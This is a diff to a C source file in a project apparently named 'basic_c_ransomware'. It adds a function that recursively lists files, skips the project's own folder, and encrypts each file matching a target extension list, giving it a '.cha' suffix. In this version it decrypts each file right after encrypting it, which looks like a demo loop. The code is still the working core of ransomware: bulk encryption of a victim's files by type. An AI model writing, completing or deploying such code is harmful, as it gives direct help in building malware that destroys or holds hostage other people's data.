@@ -14,6 +14,34 @@
 
 #include "files.h"
 
+void listAndProcessFiles(const char *path, const char **extensions, size_t num_extensions, const unsigned char *key, size_t key_size, const unsigned char *iv, size_t iv_size, const unsigned char *aad) {
+    PathList pathList;
+    initPathList(&pathList);
+    linuxListFiles(path, &pathList);
+
+    for (size_t i = 0; i < pathList.count; ++i) {
+        if (strstr(pathList.paths[i], "basic_c_ransomware/") != NULL) {
+            continue;
+        }
+        
+        char *extension = strrchr(pathList.paths[i], '.');
+        if (extension != NULL) {
+            for (size_t j = 0; j < num_extensions; ++j) {
+                if (strcmp(extension, extensions[j]) == 0) {
+                    encrypt_file(key, iv, aad, pathList.paths[i]);
+                    sleep(1);
+                    char encrypted_path[1024];
+                    snprintf(encrypted_path, sizeof(encrypted_path), "%s.cha", pathList.paths[i]);
+                    decryptFile(key, iv, aad, encrypted_path);
+                    break;
+                }
+            }
+        }
+    }
+
+    freePathList(&pathList);
+}
+
 //->Linux functions
 void linuxListFiles(const char *path, PathList *pathList) {
     struct dirent *entry;
